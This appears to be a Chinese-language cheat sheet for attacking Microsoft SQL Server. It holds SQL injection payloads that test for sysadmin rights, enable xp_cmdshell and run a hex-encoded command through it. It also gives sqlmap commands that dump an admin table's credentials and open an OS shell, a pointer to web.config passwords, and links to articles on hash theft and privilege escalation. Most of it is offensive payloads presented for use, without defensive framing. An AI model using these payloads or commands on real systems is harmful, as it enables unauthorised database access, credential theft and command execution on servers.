# SqlServer

端口 1433


__工具__

* SQLTools 2.0
## 注入

```sql
';declare @x char(9);set @x=0x303a303a35;waitfor delay @x--         # 例如我想执行延时5s，先将'0:0:5'转为十六进制 : 27303a303a3527
admin';declare @x char(9);if((select IS_SRVROLEMEMBER('sysadmin'))=1) waitfor delay '0:0:5'--   # 判断sa权限
# 开启xpcmshell：
admin';declare @x char(9);EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
# 判断开启xpcmdshell:
admin';declare @x char(9);if((select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell')=1) waitfor delay '0:0:4'--
# 执行命令, 16进制编码一下
admin';declare @x char(8000);set @x=0x70696e6720312e312e312e31;waitfor exec master..xp_cmdshell @x--
```

## SqlServer 2000 在win7x64安装条件

1.计算机名更改为全用大写字符就可以了。
2.设置SETUPSQL.exe 兼容性为winxp, 管理员身份证运行

## 转义
sqlsserver 用"" 来转义 "

## 删除/备份/导入导出
cracer.mdf
cracer_log.ldf

两个文件都要备份提取。

数据库Path: C:\Progran Files\Microsoft SQL Server\MSSQL10_50.HSSOLSERVER\MSSQL\DATA

## 数据库权限
```
sa权限 - system
db权限 - users-adminstrators
public - guest-users
```

```bash
sqlmap -u http://url.php?id=1 --current-db --batch # 得到test
sqlmap -u http://url.php?id=1 --current-user
sqlmap -u http://url.php?id=1 --is-dba
sqlmap -u http://url.php?id=1 -D test --tables           # 得到admin
sqlmap -u http://url.php?id=1 -D test -T admin --columns # 得到admin,pass
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump
sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump --hex
sqlmap -u http://url.php?id=1 --os-shell
```

## config密码等 

在asp web的目录下

web.config

## 命令执行

方法一：xp_cmdshell 

exec master..xp_cmdshell "whoami"默认执行是关闭 

https://blog.csdn.net/weixin_30654583/article/details/97225375

# Article
[窃取MSSQL 各版本密码 HASH](https://mp.weixin.qq.com/s/w9NqP4AqDth6sLbHAPF4AQ)
[sql server提权总结](https://mp.weixin.qq.com/s/3Q6meWdMLfls5cK1j80tFw)
[MSSQL注入和漏洞利用姿势总结](https://mp.weixin.qq.com/s/OakfrGRvYPYGFLY_30aj5w)
[红队必修课之针对MSSQL数据库攻击尝试](https://forum.butian.net/share/1390)
[关于mssql注入的知识分享](https://mp.weixin.qq.com/s/sXt9zd18lD4Al4OC3mmsKw)
[MSSQL渗透tips总结](https://mp.weixin.qq.com/s/TjZGGQY9blMMv-ERtCklDw)

